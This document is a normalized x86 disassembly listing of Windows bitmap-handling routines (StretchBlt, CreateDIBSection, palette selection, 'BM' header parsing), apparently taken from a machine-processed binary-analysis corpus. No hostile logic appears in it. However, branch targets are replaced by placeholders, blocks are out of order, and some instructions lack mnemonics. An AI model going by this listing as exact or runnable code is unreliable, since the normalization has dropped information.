call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_428274
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call SetStretchBltMode
mov eax ebx
call sub_428308
mov dl [ r-xdata ]
call sub_42571c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_428648
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_428308
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42827b
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_428209
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_428308
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_428288
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4284c8
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_427ed4
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_42598c
sub_428308
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4284c8
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4270a4
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_427f94
sub_428350
push ebx
mov ebx eax
mov eax ebx
call sub_4284b8
mov eax ebx
call sub_4284c8
mov edx ebx
mov eax ebx
call sub_427f94
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_428374
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4283f4
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423f34
mov eax ebx
call sub_4283c4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_428308
xor edx edx
pop ecx
call sub_4255d4
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_428444
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4286a8
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_42746c
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4284c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41ae88
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42854b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_428568
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_428612
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4284b8
mov eax ebx
call sub_4284c8
mov eax edi
call sub_423f34
mov ecx eax
mov esi [ ebx + 0x28 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427b34
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
lea eax [ ebp - 0x5c ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
call sub_427ad0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428617
mov eax [ ebp - 0x8 ]
call sub_423664
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a8c
call sub_403ae0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_428648
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_4284b8
mov eax ebx
call sub_4284c8
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4283f4
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427b34
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_427028
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4286a8
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_426124
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_427028
push 0x0
call GetDC
call sub_425a34
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428760
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_425908
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_427ed4
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4284b8
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4287e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41ae68
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_428e98
pop esi
pop ebx
retn
sub_428808
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42888f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4288ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42729c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_427298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4288f6
push rw-data
call LeaveCriticalSection
retn
sub_428908
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_428e98
pop edx
pop edi
pop esi
pop ebx
retn
sub_428930
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026ec
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_428e4d
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_428e20
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cc4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425920
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b104
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402cc4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b094
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_425ba4
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425bc4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b094
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425a34
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_428d9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425e6c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026ec
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_428d03
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b094
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_428cd7
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426124
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d008
call sub_425920
jmp r-xdata
xor eax eax
push ebp
push sub_428d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b094
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428cde
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428da2
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d008
call sub_425920
jmp r-xdata
sub_428cde
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_428da2
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_428e37
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426124
mov [ ebp - 0x30 ] eax
sub_428e54
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428808
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428e98
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4284b8
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b094
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428808
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428930
call sub_425920
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_428f08
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_4284b8
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_427ad0
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_428fa3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428fcc
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_428374
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4284b8
mov eax esi
call sub_4286a8
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_4284b8
mov eax esi
call sub_4286a8
mov eax esi
call sub_428444
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_427ad0
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_427ed4
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428808
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428808
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_42746c
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429104
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4284c8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427ed4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429158
push ebx
push esi
